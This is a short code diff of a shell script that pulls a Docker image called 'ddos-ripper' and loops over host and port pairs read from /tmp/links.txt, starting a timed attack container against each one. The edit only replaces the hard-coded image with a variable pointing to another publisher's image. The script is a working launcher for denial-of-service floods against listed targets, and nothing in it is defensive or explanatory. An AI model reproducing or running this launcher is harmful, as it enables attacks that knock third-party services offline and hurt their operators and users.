@@ -1,4 +1,5 @@
-sudo docker pull nitupkcuf/ddos-ripper:latest
+IMAGE="dieputindie/ddos-ripper:latest"
+sudo docker pull $IMAGE
 
 if file /tmp/links.txt | grep CRLF; then
     echo "/tmp/links.txt contains CRLF. Converting file"
@@ -17,7 +18,7 @@ while read link; do
         PORT=$(echo $ip | awk -F ' ' '{print $2}')
         echo "HOSTNAME $HOSTNAME"
         echo "PORT $PORT"
-        sudo docker stop -t $1 $(sudo docker run -e HOSTNAME=$HOSTNAME -e PORT=$PORT -d --stop-signal 2 nitupkcuf/ddos-ripper:latest) &
+        sudo docker stop -t $1 $(sudo docker run -e HOSTNAME=$HOSTNAME -e PORT=$PORT -d --stop-signal 2 $IMAGE) &
         sleep 5
     done <ips
 
